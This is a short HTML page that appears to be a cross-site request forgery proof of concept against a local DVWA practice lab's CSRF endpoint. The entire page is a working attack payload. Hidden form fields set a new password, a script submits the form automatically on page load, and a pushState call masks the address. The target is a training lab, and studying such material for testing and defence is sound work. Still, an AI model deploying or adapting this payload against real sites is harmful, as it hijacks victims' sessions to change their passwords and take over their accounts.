<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:8080/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="pass" />
      <input type="hidden" name="password&#95;conf" value="pass" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
